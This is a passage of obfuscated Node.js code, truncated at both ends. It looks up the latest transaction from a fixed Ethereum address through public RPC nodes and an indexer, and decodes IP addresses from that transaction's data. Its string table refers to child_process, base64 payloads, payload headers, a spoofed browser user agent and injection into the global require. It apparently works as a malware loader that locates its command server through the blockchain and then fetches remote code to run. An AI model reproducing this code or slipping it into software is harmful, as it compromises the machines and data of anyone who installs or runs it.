2\x27]=\x27','0\x20(Windows','end','vfybc','3625155vsoNen','h.blocksco',':443/0x/ls','concat','_H\x27]=\x27','data','pipe','lXKSQ','qrMrc','h-mainnet.','gzip','eth_getBlo','ksFrG','stapi.io','D311D3080e','public.bla','ohHjG','1.0.0.0\x20Sa','find','Non-JSON\x20f','coding','Agent','e.com','gyrez','x-payload-','Payload-B6','goaMs','ort=desc&f','base64','blockNumbe','_t_u\x27]=\x27','jSDuK','map','al=global;','aeWoJ','http://','Content-Le','paFrm','csPSI','_H2','r\x27]=requir','om\x20','rBNGd','protocol','toLowerCas','add','\x20failed\x20fr','zchEg','qofXT','run','byteLength','_t_s\x27]=\x27','ckOdG','headers','9aDC2490Ef','e;global[\x27','HmyqH','Empty\x20payl','qaolA','liDecompre','slice','QmWvB','gVHhx','fcwUA','https://1r','pVvFH','transactio','jvbjl','n/json','eth_blockN','ZmRTU','OAadt','isArray','filter','AQfhj','MQdsj','JsHiI','lhkFZ','then','HTTP\x20','QywDW','\x20NT\x2010.0;\x20','rom\x20','dGMWu','on=txlist&','@^1aQk','request','statusCode','bjFmF','findIndex','ate','hostname','XLlwM','&startbloc','KarYB','k=0&endblo','XhRCx','fycDG','trim','ckByNumber','utf8','hereum-rpc','ut.com/api','atcEx','TeUiZ','replace','?module=ac','HYLVl','Win64;\x20x64',';var\x20_glob','ike\x20Gecko)','address=','hex','node','eCgpk','LarGF','iuuQj','node:http','signal','VNxhc','any','message','_t_s','error','Content-Ty','kixLO','Dwgab','tbhzo','count&acti','6f0121063e','ktMtm','parse','CRaIb','ate,\x20br','stringify','toQCY','zROSG','CNzgK',')\x20AppleWeb','has','global[\x27_V','createGunz','Ztquq','GbHUs','keep-alive','catch','wClIb','push','HEAD','KtLZE','content-en','SnnIF','eth_getTra','node:https','IKuUS','node:child','XPtEC',',Sr3=@','unref',':443/0x/cl','Dwetk','35sXWIuS','YrZWv','nJAqX','.publicnod','write','_t_u','JQFEC','xPpyf','Dtfma','pathname','SuwOR','phUVL','stener','WVxbp','m\x27]=module','port','UaMqV','cLZWW','KQheR','sHZmR','min','get','nHZqM','EKoYx','kIXwj','q4FZkxX{!h'];_0x2976=function(){return _0x2f55ab;};return _0x2976();}function decompressStream(_0x5ad7ad){const _0x5a10f0=_0x32ebc7,_0x2bc10f={'XhRCx':_0x5a10f0(0x226)+_0x5a10f0(0x1a4),'dGMWu':function(_0x44314f,_0x289705){return _0x44314f===_0x289705;},'qrMrc':_0x5a10f0(0x19a),'VNxhc':function(_0x15401f,_0x39915b){return _0x15401f===_0x39915b;},'bjFmF':_0x5a10f0(0x16c),'dakVZ':function(_0x2e2298,_0x3a648b){return _0x2e2298===_0x3a648b;},'YEYXb':_0x5a10f0(0x17a)},_0xc34969=(_0x5ad7ad[_0x5a10f0(0x1c5)][_0x2bc10f[_0x5a10f0(0x1f0)]]||'')[_0x5a10f0(0x1bc)+'e']();return _0x2bc10f[_0x5a10f0(0x1e3)](_0x2bc10f[_0x5a10f0(0x198)],_0xc34969)||_0x2bc10f[_0x5a10f0(0x207)](_0x2bc10f[_0x5a10f0(0x1e8)],_0xc34969)?_0x5ad7ad[_0x5a10f0(0x196)](zlib[_0x5a10f0(0x21d)+'ip']()):_0x2bc10f[_0x5a10f0(0x175)](_0x2bc10f[_0x5a10f0(0x282)],_0xc34969)?_0x5ad7ad[_0x5a10f0(0x196)](zlib[_0x5a10f0(0x285)+_0x5a10f0(0x1ea)]()):_0x2bc10f[_0x5a10f0(0x207)]('br',_0xc34969)?_0x5ad7ad[_0x5a10f0(0x196)](zlib[_0x5a10f0(0x179)+_0x5a10f0(0x1cb)+'ss']()):_0x5ad7ad;}function httpRequest(_0x46d256,{method:_0x242ec8=_0x32ebc7(0x178),body:_0x59b024,signal:_0x183ccb}={}){const _0x1dba90=_0x32ebc7,_0x1c751c={'bkBiz':_0x1dba90(0x1f4),'qaolA':function(_0x41de63,_0x10c27e){return _0x41de63<_0x10c27e;},'AKolx':function(_0x494707,_0xa0b662){return _0x494707>=_0xa0b662;},'fjQdv':function(_0xc20486,_0xb66712){return _0xc20486(_0xb66712);},'DbkJf':function(_0x18343b,_0x3d2204){return _0x18343b===_0x3d2204;},'UceIc':function(_0x4723ce,_0x4c7a5f){return _0x4723ce!==_0x4c7a5f;},'CRaIb':function(_0x4b68c0,_0x29c3d7){return _0x4b68c0(_0x29c3d7);},'QmWvB':function(_0x1a66a4,_0x49a858){return _0x1a66a4(_0x49a858);},'xtqat':_0x1dba90(0x195),'aFRsH':_0x1dba90(0x18e),'phFLU':_0x1dba90(0x20b),'XPtEC':function(_0x228e1c,_0x236512){return _0x228e1c===_0x236512;},'ZxJiX':_0x1dba90(0x156),'KQheR':function(_0x1b9544,_0x2ef84b){return _0x1b9544+_0x2ef84b;},'aeWoJ':function(_0x291a2c,_0x3a8c33){return _0x291a2c!=_0x3a8c33;},'jvbjl':function(_0x43fa1b,_0x4d4af9){return _0x43fa1b===_0x4d4af9;},'zchEg':_0x1dba90(0x16a)+_0x1dba90(0x1d4),'WLJvS':_0x1dba90(0x256)+_0x1dba90(0x215),'EKoYx':_0x1dba90(0x220),'VVvYi':function(_0x52abd7,_0x1f26e3){return _0x52abd7!=_0x1f26e3;},'ohHjG':_0x1dba90(0x20c)+'pe','Ztquq':_0x1dba90(0x1b4)+_0x1dba90(0x25e)},_0x1ef1f2=new URL(_0x46d256),_0x3e9a84=_0x1c751c[_0x1dba90(0x1d3)](_0x1c751c[_0x1dba90(0x173)],_0x1ef1f2[_0x1dba90(0x1bb)])?https:http,_0x32ed04={'Accept':_0x1c751c[_0x1dba90(0x1bf)],'Accept-Encoding':_0x1c751c[_0x1dba90(0x26f)],'Connection':_0x1c751c[_0x1dba90(0x248)]};return _0x1c751c[_0x1dba90(0x268)](null,_0x59b024)&&(_0x32ed04[_0x1c751c[_0x1dba90(0x1a0)]]=_0x1c751c[_0x1dba90(0x1bf)],_0x32ed04[_0x1c751c[_0x1dba90(0x21e)]]=Buffer[_0x1dba90(0x1c2)](_0x59b024)),new Promise((_0x1a02e6,_0x40c87b)=>{const _0x34d936=_0x1dba90,_0x53e14a={'EatxF':_0x1c751c[_0x34d936(0x180)],'rUeLj':function(_0x238b83,_0x55f213){const _0x389b17=_0x34d936;return _0x1c751c[_0x389b17(0x1ca)](_0x238b83,_0x55f213);},'uLUYW':function(_0x327e43,_0x2cdfe2){const _0x22e147=_0x34d936;return _0x1c751c[_0x22e147(0x189)](_0x327e43,_0x2cdfe2);},'ckOdG':function(_0x5df45,_0x14afe3){const _0x4bf354=_0x34d936;return _0x1c751c[_0x4bf354(0x177)](_0x5df45,_0x14afe3);},'RREBd':function(_0x201425,_0x30e2ed){const _0x22eef1=_0x34d936;return _0x1c751c[_0x22eef1(0x15c)](_0x201425,_0x30e2ed);},'SnnIF':function(_0x966893,_0x5a8f14){const _0x155197=_0x34d936;return _0x1c751c[_0x155197(0x260)](_0x966893,_0x5a8f14);},'SuwOR':function(_0x14288b,_0x5b0bbb){const _0x1f4c4b=_0x34d936;return _0x1c751c[_0x1f4c4b(0x260)](_0x14288b,_0x5b0bbb);},'ZmRTU':function(_0x45712c,_0x5f4e22){const _0x5de204=_0x34d936;return _0x1c751c[_0x5de204(0x214)](_0x45712c,_0x5f4e22);},'kixLO':function(_0xfcd7a0,_0x27daf5){const _0x3c7b14=_0x34d936;return _0x1c751c[_0x3c7b14(0x1cd)](_0xfcd7a0,_0x27daf5);},'qofXT':_0x1c751c[_0x34d936(0x288)],'nHZqM':_0x1c751c[_0x34d936(0x286)],'pEmWS':_0x1c751c[_0x34d936(0x266)]},_0x588089=_0x3e9a84[_0x34d936(0x1e6)]({'hostname':_0x1ef1f2[_0x34d936(0x1eb)],'port':_0x1ef1f2[_0x34d936(0x240)]||(_0x1c751c[_0x34d936(0x22c)](_0x1c751c[_0x34d936(0x173)],_0x1ef1f2[_0x34d936(0x1bb)])?-0x3a1*0x2+0x226+0x6d7*0x1:0x1b13+-0x9d8+-0x10eb),'path':_0x1c751c[_0x34d936(0x243)](_0x1ef1f2[_0x34d936(0x23a)],_0x1ef1f2[_0x34d936(0x15d)]),'method':_0x242ec8,'agent':AGENTS[_0x1ef1f2[_0x34d936(0x1bb)]],'signal':_0x183ccb,'headers':_0x32ed04},_0x407a2c=>{const _0x1b9e4d=_0x34d936,_0x155860=_0x53e14a[_0x1b9e4d(0x20d)](decompressStream,_0x407a2c),_0x28baac=[];_0x155860['on'](_0x53e14a[_0x1b9e4d(0x1c0)],_0x30b7b9=>_0x28baac[_0x1b9e4d(0x223)](_0x30b7b9)),_0x155860['on'](_0x53e14a[_0x1b9e4d(0x247)],()=>{const _0x53c0f7=_0x1b9e4d,_0x397172=Buffer[_0x53c0f7(0x193)](_0x28baac)[_0x53c0f7(0x17b)](_0x53e14a[_0x53c0f7(0x181)])[_0x53c0f7(0x1f2)]();if(_0x53e14a[_0x53c0f7(0x251)](_0x407a2c[_0x53c0f7(0x1e7)],-0x1*-0x14fe+-0x1861+0x1*0x42b)||_0x53e14a[_0x53c0f7(0x16f)](_0x407a2c[_0x53c0f7(0x1e7)],-0x1*0x13e5+-0x1*0xf7f+-0x8*-0x492))return _0x53e14a[_0x53c0f7(0x1c4)](_0x40c87b,new Error(_0x53c0f7(0x1df)+_0x407a2c[_0x53c0f7(0x1e7)]+_0x53c0f7(0x150)+_0x1ef1f2[_0x53c0f7(0x1eb)]+':\x20'+_0x397172[_0x53c0f7(0x1cc)](-0x15b+0x2064+0x46f*-0x7,-0x10fb+0x878*0x4+-0x106d)));if(!_0x397172||_0x53e14a[_0x53c0f7(0x25c)]('<',_0x397172[-0x16c*0x1a+-0xf6+0x25ee])||_0x53e14a[_0x53c0f7(0x227)]('{',_0x397172[0x175e+-0x27f+0x1*-0x14df])&&_0x53e14a[_0x53c0f7(0x23b)]('[',_0x397172[-0x1cf0+-0x1ae1+0x129b*0x3]))return _0x53e14a[_0x53c0f7(0x1c4)](_0x40c87b,new Error(_0x53c0f7(0x1a3)+_0x53c0f7(0x1e2)+_0x1ef1f2[_0x53c0f7(0x1eb)]+':\x20'+_0x397172[_0x53c0f7(0x1cc)](-0x14ce+0x73b+-0x1*-0xd93,-0x619+-0x1c7f+-0x108*-0x22)));try{_0x53e14a[_0x53c0f7(0x1c4)](_0x1a02e6,JSON[_0x53c0f7(0x213)](_0x397172));}catch(_0x445d56){_0x53e14a[_0x53c0f7(0x1d6)](_0x40c87b,new Error(_0x53c0f7(0x160)+_0x53c0f7(0x1be)+_0x53c0f7(0x1b9)+_0x1ef1f2[_0x53c0f7(0x1eb)]+':\x20'+_0x445d56[_0x53c0f7(0x209)]));}}),_0x155860['on'](_0x53e14a[_0x1b9e4d(0x274)],_0x40c87b);});_0x588089['on'](_0x1c751c[_0x34d936(0x266)],_0x40c87b),_0x1c751c[_0x34d936(0x1b2)](null,_0x59b024)&&_0x588089[_0x34d936(0x235)](_0x59b024),_0x588089[_0x34d936(0x18e)]();});}async function withRpcEndpoints(_0x5c443a,_0x5cd40d){const _0x5502ef=_0x32ebc7,_0x2f62ac=RPC_ENDPOINTS[_0x5502ef(0x1b0)](()=>new AbortController());_0x2f62ac[_0x5502ef(0x275)](_0x350133=>linkAbort(_0x5cd40d,_0x350133));try{return await Promise[_0x5502ef(0x208)](RPC_ENDPOINTS[_0x5502ef(0x1b0)]((_0x407b1f,_0xd4b129)=>_0x5c443a(_0x407b1f,_0x2f62ac[_0xd4b129][_0x5502ef(0x206)])));}finally{for(const _0x2fb4fe of _0x2f62ac)_0x2fb4fe[_0x5502ef(0x162)]();}}async function rpcCall(_0xab486f,_0x48efd2,_0xbe9e4a,_0x1070e3){const _0x27688b=_0x32ebc7,_0x240574={'TeUiZ':function(_0x22e0ab,_0x57207f,_0x35b544){return _0x22e0ab(_0x57207f,_0x35b544);},'RYmwT':_0x27688b(0x25a),'fcwUA':_0x27688b(0x276)};return(await _0x240574[_0x27688b(0x1f8)](httpRequest,_0xab486f,{'method':_0x240574[_0x27688b(0x27c)],'body':JSON[_0x27688b(0x216)]({'jsonrpc':_0x240574[_0x27688b(0x1cf)],'id':0x1,'method':_0x48efd2,'params':_0xbe9e4a}),'signal':_0x1070e3}))[_0x27688b(0x24e)];}async function rpcBatch(_0x233952,_0x78c57,_0x4d72e7){const _0x1c1ec6=_0x32ebc7,_0x17baef={'EwrYS':function(_0x2028fe,_0x5a3ca5,_0x2cadf9){return _0x2028fe(_0x5a3ca5,_0x2cadf9);},'JsHiI':_0x1c1ec6(0x25a)},_0x1772d1=await _0x17baef[_0x1c1ec6(0x26c)](httpRequest,_0x233952,{'method':_0x17baef[_0x1c1ec6(0x1dc)],'body':JSON[_0x1c1ec6(0x216)](_0x78c57[_0x1c1ec6(0x1b0)](([_0x30f886,_0x5173de],_0x44e73f)=>({'jsonrpc':_0x1c1ec6(0x276),'id':_0x44e73f+(0x1*0x72b+0x42e*-0x1+-0x2fc),'method':_0x30f886,'params':_0x5173de}))),'signal':_0x4d72e7}),_0x4f54b5=new Map(_0x1772d1[_0x1c1ec6(0x1b0)](_0x5a01cc=>[_0x5a01cc['id'],_0x5a01cc]));return _0x78c57[_0x1c1ec6(0x1b0)]((_0x41dc1b,_0xe90ad6)=>_0x4f54b5[_0x1c1ec6(0x246)](_0xe90ad6+(0x3e7+0x8*0x2f0+-0xe*0x1f5))[_0x1c1ec6(0x24e)]);}const toBlockHex=_0x2f9a04=>'0x'+_0x2f9a04[_0x32ebc7(0x17b)](-0x3*-0xba3+-0x11be+0x1*-0x111b);function findSenderTx(_0x4bb0dd){const _0x44b3fe=_0x32ebc7;return _0x4bb0dd[_0x44b3fe(0x1a2)](_0x495067=>_0x495067[_0x44b3fe(0x267)]&&_0x495067[_0x44b3fe(0x267)][_0x44b3fe(0x1bc)+'e']()===SENDER)||null;}function decodeAddress(_0x378300){const _0x36929c=_0x32ebc7,_0x21720c={'bIYbo':_0x36929c(0x200),'phUVL':function(_0x4b1eac,_0x12a8c6){return _0x4b1eac(_0x12a8c6);}},_0x3da8b7=Buffer[_0x36929c(0x267)](_0x378300[_0x36929c(0x1f9)](/^0x/i,''),_0x21720c[_0x36929c(0x15b)]),_0x38d78f=_0x2e8963=>_0x2e8963[0x6f+0x24a5+-0x2514]+'.'+_0x2e8963[0xde+-0x6*-0x251+-0xec3]+'.'+_0x2e8963[0x1445*-0x1+-0x1*-0x21ff+-0xdb8]+'.'+_0x2e8963[0x787*-0x1+0x119f+-0xa15*0x1];return[_0x21720c[_0x36929c(0x23c)](_0x38d78f,_0x3da8b7[_0x36929c(0x252)](0xa62+-0x253b*0x1+0x1ad9,0x1ca7+-0x2*-0xcba+0x1*-0x3617)),_0x21720c[_0x36929c(0x23c)](_0x38d78f,_0x3da8b7[_0x36929c(0x252)](0x482+-0x13bc*0x1+-0xf3e*-0x1,-0x923*-0x3+-0x25b2+0x13*0x8b))];}function _0x5ce2(_0x14c1d7,_0xb18cd8){_0x14c1d7=_0x14c1d7-(0x10da+-0x9*-0x367+-0x2e2a);const _0x4c52ba=_0x2976();let _0xa2928=_0x4c52ba[_0x14c1d7];return _0xa2928;}function firstMatch(_0xd6b05){const _0x593996={'Dwgab':function(_0x161e00,_0x4a6700){return _0x161e00(_0x4a6700);},'xPpyf':function(_0x4d03e1,_0x539535){return _0x4d03e1===_0x539535;},'rPgam':function(_0xd0a9fa,_0x43556a){return _0xd0a9fa(_0x43556a);},'tItJu':function(_0x217b24,_0x4c9938){return _0x217b24!==_0x4c9938;},'XLlwM':function(_0x5e3393,_0x1ba674){return _0x5e3393(_0x1ba674);},'cxOxO':function(_0x479e08,_0xcc1323){return _0x479e08(_0xcc1323);}};return new Promise(_0x146b8a=>{const _0x15fea5=_0x5ce2,_0x11a511={'DXZHs':function(_0x1af50c,_0x2c0a24){const _0x153bb3=_0x5ce2;return _0x593996[_0x153bb3(0x284)](_0x1af50c,_0x2c0a24);},'LRJck':function(_0x41fab7,_0x2c2b02){const _0x5626ad=_0x5ce2;return _0x593996[_0x5626ad(0x1ec)](_0x41fab7,_0x2c2b02);}};let _0x40d833=_0xd6b05[_0x15fea5(0x186)];if(!_0x40d833)return _0x593996[_0x15fea5(0x257)](_0x146b8a,null);let _0x1c007d=!(-0xb*0x33e+0x116f*-0x1+0x351a);const _0x4f6d03=_0x3be8d8=>{const _0x5c885d=_0x15fea5;if(!_0x1c007d){_0x1c007d=!(-0x126e+-0x13d6+0x2644);for(const _0x12c43 of _0xd6b05)_0x12c43[_0x5c885d(0x17e)][_0x5c885d(0x162)]();_0x593996[_0x5c885d(0x20e)](_0x146b8a,_0x3be8d8);}};for(const _0x5f327e of _0xd6b05)_0x5f327e[_0x15fea5(0x1c1)]()[_0x15fea5(0x1de)](_0x24263a=>{const _0x4cf169=_0x15fea5;_0x1c007d||(_0x24263a?_0x593996[_0x4cf169(0x20e)](_0x4f6d03,_0x24263a):_0x593996[_0x4cf169(0x238)](0xd3e+-0x1*0x358+-0x16a*0x7,--_0x40d833)&&_0x593996[_0x4cf169(0x169)](_0x146b8a,null));})[_0x15fea5(0x221)](()=>{const _0x4a4ec4=_0x15fea5;_0x1c007d||_0x11a511[_0x4a4ec4(0x259)](0x19b7+-0x1c6d+0x2b6*0x1,--_0x40d833)||_0x11a511[_0x4a4ec4(0x157)](_0x146b8a,null);});});}function candidateBlocks(_0x35db85){const _0x1719d0=_0x32ebc7,_0x451a41={'OtppN':function(_0x579782,_0x3ca5be){return _0x579782-_0x3ca5be;},'Nfhoz':function(_0x4ff152,_0x4af7ed){return _0x4ff152-_0x4af7ed;},'WtCJu':function(_0x3f3a7e,_0x1d73ae){return _0x3f3a7e+_0x1d73ae;},'ROTcR':function(_0x508f2f,_0x4ec2d5){return _0x508f2f<_0x4ec2d5;}},_0x36c5ad=_0x451a41[_0x1719d0(0x17c)](_0x35db85,BLOCK_MULTIPLE),_0x588609=new Set(),_0x58c4e7=[];for(const _0x25e7e9 of[_0x451a41[_0x1719d0(0x158)](_0x35db85,0x1n),_0x35db85,_0x451a41[_0x1719d0(0x27f)](_0x35db85,0x1n),_0x451a41[_0x1719d0(0x158)](_0x36c5ad,0x1n),_0x36c5ad,_0x451a41[_0x1719d0(0x27f)](_0x36c5ad,0x1n)]){if(_0x451a41[_0x1719d0(0x155)](_0x25e7e9,0x0n))continue;const _0x5ce2a1=_0x25e7e9[_0x1719d0(0x17b)]();_0x588609[_0x1719d0(0x21b)](_0x5ce2a1)||(_0x588609[_0x1719d0(0x1bd)](_0x5ce2a1),_0x58c4e7[_0x1719d0(0x223)](_0x25e7e9));}return _0x58c4e7;}function blockTask(_0x444917){const _0x287667={'gVHhx':function(_0x4bfebb,_0x18a8b0,_0x147f18){return _0x4bfebb(_0x18a8b0,_0x147f18);},'HmyqH':function(_0x4ea865,_0x27dc80){return _0x4ea865(_0x27dc80);}},_0x25f159=new AbortController();return{'controller':_0x25f159,'run':async()=>{const _0xecc7f8=_0x5ce2,_0x3b93a3=await _0x287667[_0xecc7f8(0x1ce)](withRpcEndpoints,(_0x3df153,_0x451c17)=>rpcCall(_0x3df153,_0xecc7f8(0x19b)+_0xecc7f8(0x1f3),[toBlockHex(_0x444917),!(0x1a56+0x1c98+-0xb2*0x4f)],_0x451c17),_0x25f159[_0xecc7f8(0x206)]),_0x22bc28=_0x3b93a3?.[_0xecc7f8(0x1d2)+'ns'];if(!Array[_0xecc7f8(0x1d8)](_0x22bc28))return null;const _0x1fd138=_0x287667[_0xecc7f8(0x1c8)](findSenderTx,_0x22bc28);return _0x1fd138?{'blockNumber':_0x444917,'tx':_0x1fd138}:null;}};}async function nonceAtBlocks(_0x4472b0,_0x1da9aa){const _0x3140cc=_0x32ebc7,_0x3bd1f1={'ImhvX':function(_0x54cebb,_0x271e9f,_0x3c006e){return _0x54cebb(_0x271e9f,_0x3c006e);}},_0x363cfe=_0x4472b0[_0x3140cc(0x1b0)](_0x4f3ac4=>[_0x3140cc(0x228)+_0x3140cc(0x24b)+_0x3140cc(0x254),[SENDER,toBlockHex(_0x4f3ac4)]]);try{return(await _0x3bd1f1[_0x3140cc(0x258)](withRpcEndpoints,(_0x34fa90,_0x2b8576)=>rpcBatch(_0x34fa90,_0x363cfe,_0x2b8576),_0x1da9aa))[_0x3140cc(0x1b0)](BigInt);}catch{return(await Promise[_0x3140cc(0x26d)](_0x363cfe[_0x3140cc(0x1b0)](([_0x498633,_0x3e3f79])=>withRpcEndpoints((_0x176836,_0x181a3b)=>rpcCall(_0x176836,_0x498633,_0x3e3f79,_0x181a3b),_0x1da9aa))))[_0x3140cc(0x1b0)](BigInt);}}async function lastSenderTx(_0x245044){const _0x548ae6=_0x32ebc7,_0x3f8b92={'wClIb':function(_0x2ec092,_0x222cc9){return _0x2ec092(_0x222cc9);},'pVvFH':function(_0x19fd38,_0xd91ac6,_0x23a2a4){return _0x19fd38(_0xd91ac6,_0x23a2a4);},'OAadt':function(_0x707a06,_0x44cceb){return _0x707a06-_0x44cceb;},'vfybc':function(_0x5a802f,_0x48536e){return _0x5a802f-_0x48536e;},'lAfgW':function(_0x2eb1ee,_0x533dda){return _0x2eb1ee>_0x533dda;},'JQFEC':function(_0xe8db82,_0xdee992){return _0xe8db82-_0xdee992;},'KSYbs':function(_0x2dc5ef,_0x2c62a6){return _0x2dc5ef(_0x2c62a6);},'gyrez':function(_0x527010,_0x570a19){return _0x527010(_0x570a19);},'HlkfO':function(_0x332513,_0x345d0e){return _0x332513<=_0x345d0e;},'GbHUs':function(_0x24d1bf,_0x288bcb){return _0x24d1bf+_0x288bcb;},'jSDuK':function(_0x2e0e52,_0x49568c){return _0x2e0e52/_0x49568c;},'QywDW':function(_0x5564ee,_0x57323d){return _0x5564ee*_0x57323d;},'Dwetk':function(_0x1103f5,_0x4c4181){return _0x1103f5-_0x4c4181;},'KarYB':function(_0x152806,_0x1c9e47){return _0x152806+_0x1c9e47;},'paFrm':function(_0x4801d1,_0x5681c0,_0x530464){return _0x4801d1(_0x5681c0,_0x530464);},'RZonu':function(_0x5931b3,_0x23d241){return _0x5931b3===_0x23d241;},'NQkqG':function(_0x448664,_0x4d9a48){return _0x448664-_0x4d9a48;},'tpATb':function(_0x340e4c,_0x48f9d1){return _0x340e4c>_0x48f9d1;},'qiIzp':function(_0x53e099,_0x20a73e){return _0x53e099===_0x20a73e;},'HYLVl':function(_0x12f4fc,_0x4f793d){return _0x12f4fc===_0x4f793d;},'sHZmR':function(_0x2833c6,_0x3986cb){return _0x2833c6(_0x3986cb);},'nJAqX':function(_0x2e0cec,_0x34bffc){return _0x2e0cec(_0x34bffc);}},_0x14b0d8=new AbortController();try{const _0x24739f=_0x245044??_0x3f8b92[_0x548ae6(0x222)](BigInt,await _0x3f8b92[_0x548ae6(0x1d1)](withRpcEndpoints,(_0x2aeb1e,_0x204973)=>rpcCall(_0x2aeb1e,_0x548ae6(0x1d5)+_0x548ae6(0x161),[],_0x204973),_0x14b0d8[_0x548ae6(0x206)])),_0x54c431=_0x3f8b92[_0x548ae6(0x222)](BigInt,await _0x3f8b92[_0x548ae6(0x1d1)](withRpcEndpoints,(_0x52d7e3,_0x3aecba)=>rpcCall(_0x52d7e3,_0x548ae6(0x228)+_0x548ae6(0x24b)+_0x548ae6(0x254),[SENDER,toBlockHex(_0x24739f)],_0x3aecba),_0x14b0d8[_0x548ae6(0x206)])),_0x5cf9e1=_0x3f8b92[_0x548ae6(0x1d7)](_0x54c431,0x1n);let _0x4d3b93=_0x3f8b92[_0x548ae6(0x18f)](SEARCH_FLOOR,0x1n),_0x47834d=_0x24739f;for(;_0x3f8b92[_0x548ae6(0x27b)](_0x3f8b92[_0x548ae6(0x18f)](_0x47834d,_0x4d3b93),0x1n);){const _0x12f1f7=_0x3f8b92[_0x548ae6(0x18f)](_0x3f8b92[_0x548ae6(0x237)](_0x47834d,_0x4d3b93),0x1n),_0x5341ca=_0x3f8b92[_0x548ae6(0x18a)](BigInt,Math[_0x548ae6(0x245)](NONCE_FANOUT,_0x3f8b92[_0x548ae6(0x1a7)](Number,_0x12f1f7))),_0x1c604f=[];for(let _0x16488c=0x1n;_0x3f8b92[_0x548ae6(0x17f)](_0x16488c,_0x5341ca);_0x16488c+=0x1n)_0x1c604f[_0x548ae6(0x223)](_0x3f8b92[_0x548ae6(0x21f)](_0x4d3b93,_0x3f8b92[_0x548ae6(0x1af)](_0x3f8b92[_0x548ae6(0x1e0)](_0x16488c,_0x3f8b92[_0x548ae6(0x230)](_0x47834d,_0x4d3b93)),_0x3f8b92[_0x548ae6(0x1ee)](_0x5341ca,0x1n))));const _0x38ae16=(await _0x3f8b92[_0x548ae6(0x1b5)](nonceAtBlocks,_0x1c604f,_0x14b0d8[_0x548ae6(0x206)]))[_0x548ae6(0x1e9)](_0x141ea6=>_0x141ea6>=_0x54c431);_0x3f8b92[_0x548ae6(0x25d)](-(0x67d*-0x1+0x9*0x23b+-0xd95),_0x38ae16)?_0x4d3b93=_0x1c604f[_0x3f8b92[_0x548ae6(0x187)](_0x1c604f[_0x548ae6(0x186)],-0x22*0x119+-0x26*-0xd7+0x569)]:(_0x47834d=_0x1c604f[_0x38ae16],_0x3f8b92[_0x548ae6(0x262)](_0x38ae16,0x1fa9+-0x13*-0x187+-0x3cae)&&(_0x4d3b93=_0x1c604f[_0x3f8b92[_0x548ae6(0x230)](_0x38ae16,-0xf36+-0x5c7*0x1+0x14fe*0x1)]));}const _0x17ba7e=await _0x3f8b92[_0x548ae6(0x1d1)](withRpcEndpoints,(_0x543ba0,_0x13219e)=>rpcCall(_0x543ba0,_0x548ae6(0x19b)+_0x548ae6(0x1f3),[toBlockHex(_0x47834d),!(-0x1885+-0x18fd*-0x1+-0x78)],_0x13219e),_0x14b0d8[_0x548ae6(0x206)]),_0x28f9a9=_0x17ba7e?.[_0x548ae6(0x1d2)+'ns']||[];let _0x2acbef=null;for(const _0x444acc of _0x28f9a9)if(_0x444acc[_0x548ae6(0x267)]&&_0x3f8b92[_0x548ae6(0x167)](_0x444acc[_0x548ae6(0x267)][_0x548ae6(0x1bc)+'e'](),SENDER)){if(_0x3f8b92[_0x548ae6(0x1fb)](_0x3f8b92[_0x548ae6(0x18a)](BigInt,_0x444acc[_0x548ae6(0x263)]),_0x5cf9e1)){_0x2acbef=_0x444acc;break;}(!_0x2acbef||_0x3f8b92[_0x548ae6(0x262)](_0x3f8b92[_0x548ae6(0x244)](BigInt,_0x444acc[_0x548ae6(0x263)]),_0x3f8b92[_0x548ae6(0x233)](BigInt,_0x2acbef[_0x548ae6(0x263)])))&&(_0x2acbef=_0x444acc);}return{'blockNumber':_0x47834d,'tx':_0x2acbef};}finally{_0x14b0d8[_0x548ae6(0x162)]();}}async function lastSenderTxViaIndexer(){const _0x2f91fc=_0x32ebc7,_0x34d593={'jisND':function(_0x2c5f74,_0x2ff29b){return _0x2c5f74(_0x2ff29b);},'KhulI':function(_0x3cd32b,_0x2b3965){return _0x3cd32b(_0x2b3965);}},_0x5aa52d=INDEXER_URL+(_0x2f91fc(0x1fa)+_0x2f91fc(0x210)+_0x2f91fc(0x1e4)+_0x2f91fc(0x1ff))+SENDER+(_0x2f91fc(0x1ed)+_0x2f91fc(0x1ef)+_0x2f91fc(0x18b)+_0x2f91fc(0x287)+_0x2f91fc(0x283)+_0x2f91fc(0x1ab)+_0x2f91fc(0x25f)+'om'),_0x59f58c=await _0x34d593[_0x2f91fc(0x159)](httpRequest,_0x5aa52d),_0x3f975e=(Array[_0x2f91fc(0x1d8)](_0x59f58c?.[_0x2f91fc(0x24e)])?_0x59f58c[_0x2f91fc(0x24e)]:[])[_0x2f91fc(0x1a2)](_0x2cf7e8=>_0x2cf7e8[_0x2f91fc(0x267)]&&_0x2cf7e8[_0x2f91fc(0x267)][_0x2f91fc(0x1bc)+'e']()===SENDER);return{'blockNumber':_0x34d593[_0x2f91fc(0x16b)](BigInt,_0x3f975e[_0x2f91fc(0x1ad)+'r']),'tx':_0x3f975e};}async function run(){const _0x5189a7=_0x32ebc7,_0x18d916={'wVsnn':function(_0x5424f9,_0x5c5529){return _0x5424f9<_0x5c5529;},'uZOyl':function(_0x57d89a,_0x2e4ac1){return _0x57d89a%_0x2e4ac1;},'QURKH':_0x5189a7(0x1f4),'MQdsj':_0x5189a7(0x1a8)+_0x5189a7(0x265),'zROSG':_0x5189a7(0x278)+_0x5189a7(0x1a9)+'4','TBqIc':function(_0x1a3d16,_0x475551){return _0x1a3d16(_0x475551);},'lXKSQ':_0x5189a7(0x1ac),'lhkFZ':function(_0x1dffdf,_0x5f0cb2){return _0x1dffdf===_0x5f0cb2;},'ktMtm':_0x5189a7(0x224),'cloXp':_0x5189a7(0x195),'eCgpk':_0x5189a7(0x18e),'etZJj':_0x5189a7(0x20b),'fycDG':function(_0x9d84ca,_0x2e2d09){return _0x9d84ca(_0x2e2d09);},'IKuUS':function(_0x13fc7a,_0x4307d2){return _0x13fc7a(_0x4307d2);},'WZVoL':_0x5189a7(0x1c9)+_0x5189a7(0x261),'KtLZE':function(_0x1017a7,_0x464250){return _0x1017a7+_0x464250;},'pMcRf':_0x5189a7(0x16d)+_0x5189a7(0x18d)+_0x5189a7(0x1e1)+_0x5189a7(0x1fc)+_0x5189a7(0x21a)+_0x5189a7(0x272)+_0x5189a7(0x164)+_0x5189a7(0x1fe)+_0x5189a7(0x15f)+_0x5189a7(0x1a1)+_0x5189a7(0x15e)+'6','csPSI':function(_0x3d56e3,_0x4c5468){return _0x3d56e3(_0x4c5468);},'dVtRN':_0x5189a7(0x178),'toQCY':function(_0x3044bb,_0x1afdd5,_0x55fb4e){return _0x3044bb(_0x1afdd5,_0x55fb4e);},'DPZMj':function(_0x2507af,_0x4ee82f){return 